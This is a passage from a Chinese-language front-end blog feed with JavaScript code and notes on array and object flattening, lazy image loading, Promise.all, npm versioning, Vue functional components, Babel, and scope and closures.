class="title function_">log</span>(<span class="string">&#x27;==&gt;&#x27;</span>, err);</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h4 id="16-数组扁平化"><a href="#16-数组扁平化" class="headerlink" title="16. 数组扁平化"></a>16. 数组扁平化</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方案 1</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">recursionFlat</span>(<span class="params">ary = []</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> res = []</span><br><span class="line">  ary.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(item)) &#123;</span><br><span class="line">      res.<span class="title function_">push</span>(...<span class="title function_">recursionFlat</span>(item))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">push</span>(item)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 方案 2</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reduceFlat</span>(<span class="params">ary = []</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> ary.<span class="title function_">reduce</span>(<span class="function">(<span class="params">res, item</span>) =&gt;</span> res.<span class="title function_">concat</span>(<span class="title class_">Array</span>.<span class="title function_">isArray</span>(item) ? <span class="title function_">reduceFlat</span>(item) : item), [])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> source = [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>, [<span class="number">5</span>, <span class="number">6</span>]], <span class="string">&#x27;7&#x27;</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">recursionFlat</span>(source))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">reduceFlat</span>(source))</span><br></pre></td></tr></table></figure><h4 id="17-对象扁平化"><a href="#17-对象扁平化" class="headerlink" title="17. 对象扁平化"></a>17. 对象扁平化</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">objectFlat</span>(<span class="params">obj = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> res = &#123;&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">flat</span>(<span class="params">item, preKey = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">entries</span>(item).<span class="title function_">forEach</span>(<span class="function">(<span class="params">[key, val]</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> newKey = preKey ? <span class="string">`<span class="subst">$&#123;preKey&#125;</span>.<span class="subst">$&#123;key&#125;</span>`</span> : key</span><br><span class="line">      <span class="keyword">if</span> (val &amp;&amp; <span class="keyword">typeof</span> val === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">flat</span>(val, newKey)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res[newKey] = val</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">flat</span>(obj)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> source = &#123; <span class="attr">a</span>: &#123; <span class="attr">b</span>: &#123; <span class="attr">c</span>: <span class="number">1</span>, <span class="attr">d</span>: <span class="number">2</span> &#125;, <span class="attr">e</span>: <span class="number">3</span> &#125;, <span class="attr">f</span>: &#123; <span class="attr">g</span>: <span class="number">2</span> &#125; &#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">objectFlat</span>(source));</span><br></pre></td></tr></table></figure><h4 id="18-图片懒加载"><a href="#18-图片懒加载" class="headerlink" title="18. 图片懒加载"></a>18. 图片懒加载</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;img src=&quot;default.png&quot; data-src=&quot;https://xxxx/real.png&quot;&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isVisible</span>(<span class="params">el</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> position = el.<span class="title function_">getBoundingClientRect</span>()</span><br><span class="line">  <span class="keyword">const</span> windowHeight = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line">  <span class="comment">// 顶部边缘可见</span></span><br><span class="line">  <span class="keyword">const</span> topVisible = position.<span class="property">top</span> &gt; <span class="number">0</span> &amp;&amp; position.<span class="property">top</span> &lt; windowHeight;</span><br><span class="line">  <span class="comment">// 底部边缘可见</span></span><br><span class="line">  <span class="keyword">const</span> bottomVisible = position.<span class="property">bottom</span> &lt; windowHeight &amp;&amp; position.<span class="property">bottom</span> &gt; <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> topVisible || bottomVisible;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">imageLazyLoad</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> images = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;img&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> img <span class="keyword">of</span> images) &#123;</span><br><span class="line">    <span class="keyword">const</span> realSrc = img.<span class="property">dataset</span>.<span class="property">src</span></span><br><span class="line">    <span class="keyword">if</span> (!realSrc) <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isVisible</span>(img)) &#123;</span><br><span class="line">      img.<span class="property">src</span> = realSrc</span><br><span class="line">      img.<span class="property">dataset</span>.<span class="property">src</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, imageLazyLoad)</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, imageLazyLoad)</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="title function_">throttle</span>(imageLazyLoad, <span class="number">1000</span>))</span><br></pre></td></tr></table></figure><h4 id="鉴别类型通用方法"><a href="#鉴别类型通用方法" class="headerlink" title="鉴别类型通用方法"></a>鉴别类型通用方法</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">type</span>(<span class="params">target</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> ret = <span class="keyword">typeof</span> target;</span><br><span class="line">  <span class="keyword">const</span> template = &#123;</span><br><span class="line">    <span class="string">&quot;[object Array]&quot;</span>: <span class="string">&quot;array&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[object Object]&quot;</span>: <span class="string">&quot;object&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[object Number]&quot;</span>: <span class="string">&quot;number - object&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[object Boolean]&quot;</span>: <span class="string">&quot;boolean - object&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[object String]&quot;</span>: <span class="string">&quot;string-object&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (target === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> str = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(target);</span><br><span class="line">    <span class="keyword">return</span> template[str];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="promiseAll"><a href="#promiseAll" class="headerlink" title="promiseAll"></a>promiseAll</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输入不仅仅只有Array</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">promiseAll</span>(<span class="params">args</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> promiseResults = [];</span><br><span class="line">    <span class="keyword">let</span> iteratorIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 已完成的数量，用于最终的返回，不能直接用完成数量作为iteratorIndex</span></span><br><span class="line">    <span class="comment">// 输出顺序和完成顺序是两码事</span></span><br><span class="line">    <span class="keyword">let</span> fullCount = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 用于迭代iterator数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> args) &#123;</span><br><span class="line">      <span class="comment">// for of 遍历顺序，用于返回正确顺序的结果</span></span><br><span class="line">      <span class="comment">// 因iterator用forEach遍历后的key和value一样，所以必须存一份for of的 iteratorIndex</span></span><br><span class="line">      <span class="keyword">let</span> resultIndex = iteratorIndex;</span><br><span class="line">      iteratorIndex += <span class="number">1</span>;</span><br><span class="line">      <span class="comment">// 包一层，以兼容非promise的情况</span></span><br><span class="line">      <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(item)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">          promiseResults[resultIndex] = res;</span><br><span class="line">          fullCount += <span class="number">1</span>;</span><br><span class="line">          <span class="comment">// Iterator 接口的数据无法单纯的用length和size判断长度，不能局限于Array和 Map类型中</span></span><br><span class="line">          <span class="keyword">if</span> (fullCount === iteratorIndex) &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(promiseResults);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理空 iterator 的情况</span></span><br><span class="line">    <span class="keyword">if</span> (iteratorIndex === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(promiseResults);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>继续加油啊！</title>
      <link href="/2022/08/07/company/"/>
      <url>/2022/08/07/company/</url>
      
        <content type="html"><![CDATA[<h3 id="城云题目"><a href="#城云题目" class="headerlink" title="城云题目"></a>城云题目</h3><h4 id="Object-keys-for-in"><a href="#Object-keys-for-in" class="headerlink" title="Object.keys(), for in"></a>Object.keys(), for in</h4><ul><li>Object.keys()：遍历对象的 key,返回一个数组，数组值为对象自有的属性，不会包括继承原型的属性</li><li>for in :以任意顺序遍历一个对象的属性，包括自身属性，以及继承自原型的属性</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">aaa</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(obj).<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(item); <span class="comment">// a,b</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key); <span class="comment">// a,b,aaa</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(obj, key)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key); <span class="comment">// a,b</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create()"></a>Object.create()</h4><h4 id="npm-包依赖关系"><a href="#npm-包依赖关系" class="headerlink" title="npm 包依赖关系"></a>npm 包依赖关系</h4><p><em>结论 1： 通过 npm 安装 express 包会将 express 的所有依赖都一起安装</em></p><p>语义版本控制程序包<code>对于一个项目或包而言，在package.json的dependencies 中声明依赖版本有这样的规则</code></p><ul><li>~(波浪线）代表当前项目接受补丁版本，也就是如果你的项目依赖为版本为 1.0.1 的某个 npm 包（假设包名叫 express），当 express 更新到 1.0.3 的时候，你运行 npm install，会自动将 express 升级为 1.0.3。</li><li>^(尖号) 代表当前项目接受 次要版本 ，也就是如果你的项目依赖为版本为 1.0.1 的某个 npm 包（假设包名叫 express），当 express 更新到 1.3.2 的时候，你运行 npm install，会自动将 express 升级为 1.3.2。</li><li>如果版本号前没有加上修饰符修饰符，则表示指定该版本进行安装。</li></ul><p><em>结论2：npm 安装的包会根据package.json中的dependencies依赖修饰符，自动升级依赖的版本。</em></p><p><em>结论3：npm会递归的安装一个包的依赖。</em></p><p><em>结论4: npm会记录安装过的包，安装过程为广度优先。</em></p><h4 id="函数式组件"><a href="#函数式组件" class="headerlink" title="函数式组件"></a>函数式组件</h4><p><code>组件没有管理任何状态,也没有监听任何传递给它的状态,也没有生命周期访问 优点就是 轻量,灵活</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&quot;heading&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">functional</span>: <span class="literal">true</span>, <span class="comment">//函数组件</span></span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">level</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">title</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">icon</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">render</span>(<span class="params">h, context</span>) &#123;</span><br><span class="line">    <span class="comment">// 子节点数组</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;上下文:&quot;</span>, context);</span><br><span class="line">    <span class="keyword">let</span> children = [];</span><br><span class="line">    <span class="comment">// 属性获取的变化</span></span><br><span class="line">    <span class="keyword">const</span> &#123; icon, title, level &#125; = context.<span class="property">props</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// icon处理</span></span><br><span class="line">    <span class="keyword">if</span> (icon) &#123;</span><br><span class="line">      children.<span class="title function_">push</span>(</span><br><span class="line">        <span class="title function_">h</span>(<span class="string">&quot;svg&quot;</span>, &#123; <span class="attr">class</span>: <span class="string">&quot;icon&quot;</span> &#125;, [</span><br><span class="line">          <span class="title function_">h</span>(<span class="string">&quot;use&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">attrs</span>: &#123; <span class="string">&quot;xlink:href&quot;</span>: <span class="string">&quot;#icon-&quot;</span> + icon &#125;,</span><br><span class="line">          &#125;),</span><br><span class="line">        ])</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">    children = children.<span class="title function_">concat</span>(context.<span class="property">children</span>);</span><br><span class="line">    <span class="keyword">const</span> vnode = <span class="title function_">h</span>(<span class="string">&quot;h&quot;</span> + level, &#123; <span class="attr">attrs</span>: &#123; title &#125; &#125;, children);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;查看&quot;</span>, vnode);</span><br><span class="line">    <span class="keyword">return</span> vnode;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="cros-的原理"><a href="#cros-的原理" class="headerlink" title="cros 的原理"></a>cros 的原理</h4><h4 id="svg-canvas-取舍"><a href="#svg-canvas-取舍" class="headerlink" title="svg canvas 取舍"></a>svg canvas 取舍</h4><h4 id="computed-第一次会执行么"><a href="#computed-第一次会执行么" class="headerlink" title="computed 第一次会执行么"></a>computed 第一次会执行么</h4><h3 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h3><h4 id="babel编译过程"><a href="#babel编译过程" class="headerlink" title="babel编译过程"></a>babel编译过程</h4><ul><li>解析（Parse）：包括词法分析和语法分析。词法分析主要把字符流源代码（Char Stream）转换成令牌流（ Token Stream），语法分析主要是将令牌流转换成抽象语法树（Abstract Syntax Tree，AST）。</li><li>转换（Transform）：通过 Babel 的插件能力，将高版本语法的 AST 转换成支持低版本语法的 AST。当然在此过程中也可以对 AST 的 Node 节点进行优化操作，比如添加、更新以及移除节点等。</li><li>生成（Generate）：将 AST 转换成字符串形式的低版本代码，同时也能创建 Source Map 映射。<h4 id="nextTick的原理"><a href="#nextTick的原理" class="headerlink" title="nextTick的原理"></a>nextTick的原理</h4></li></ul>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript es6 npm object </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入JS</title>
      <link href="/2022/07/28/hightJS/"/>
      <url>/2022/07/28/hightJS/</url>
      
        <content type="html"><![CDATA[<h3 id="一、作用域及作用域链引出闭包"><a href="#一、作用域及作用域链引出闭包" class="headerlink" title="一、作用域及作用域链引出闭包"></a>一、作用域及作用域链引出闭包</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addABC</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>,</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> add;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> globalAdd = <span class="title function_">addABC</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">globalAdd</span>()); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure><ul><li><p><code>像 a、b、c 这样在函数中被使用，但它既不是函数参数、也不是函数的局部变量，而是一个不属于当前作用域的变量，此时它相对于当前作用域来说，就是一个自由变量。而像 add 这样引用了自由变量的函数，就叫闭包</code></p></li><li><p>LHS、RHS，是引擎在执行代码的时候，查询变量的两种方式。</p><ul><li>name 变量出现在赋值操作的左侧，它就属于 LHS。LHS 意味着 变量赋值或写入内存，</li><li>RHS 意味着 变量查找或从内存中读取</li></ul></li></ul><h4 id="词法作用域及动态作用域"><a href="#词法作用域及动态作用域" class="headerlink" title="词法作用域及动态作用域"></a>词法作用域及动态作用域</h4><ul><li>JS 的作用域遵循的就是词法作用域模型。</li><li>词法作用域： 在代码书写的时候完成划分，作用域链沿着它定义的位置往外延伸</li><li>动态作用域： 在代码运行时完成划分，作用域链沿着它的调用栈往外延伸</li><li>eval with 修改词法作用域</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;xiuyan&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">changeName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">&quot;BigBear&quot;</span>;</span><br><span class="line">  <span class="title function_">showName</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">changeName</span>();</span><br></pre></td></tr></table></figure><h4 id="闭包应用"><a href="#闭包应用" class="headerlink" title="闭包应用"></a>闭包应用</h4><ul><li>模拟私有变量的实现</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用闭包生成IIFE(自执行函数)，返回 User 类</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 定义私有变量_password</span></span><br><span class="line">  <span class="keyword">let</span> _password;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">username, password</span>) &#123;</span><br><span class="line">      <span class="comment">// 初始化私有变量_password</span></span><br><span class="line">      _password = password;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">username</span> = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">// 这里我们增加一行 console，为了验证 login 里仍可以顺利拿到密码</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">username</span>, _password);</span><br><span class="line">      <span class="comment">// 使用 fetch 进行登录请求，同上，此处省略</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">User</span>;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;xiuyan&quot;</span>, <span class="string">&quot;xiuyan123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">username</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">password</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">_password</span>);</span><br><span class="line">user.<span class="title function_">login</span>();</span><br></pre></td></tr></table></figure><p><code>像 password 这样的变量，我们希望它仅在对象内部生效，无法从外部触及，这样的变量，就是私有变量。</code></p><ul><li>偏函数与柯里化（需要多个入参的函数，转化为需要更少入参的函数的方法。）<ul><li>柯里化是把接受 n 个参数的 1 个函数改造为只接受 1 个参数的 n 个互相嵌套的函数的过程。也就是 fn (a, b, c)会变成 fn (a)(b)(c)。</li><li>偏函数应用相比之下就 “随意” 一些了。偏函数是说，固定你函数的某一个或几个参数，然后返回一个新的函数（这个函数用于接收剩下的参数）。你有 10 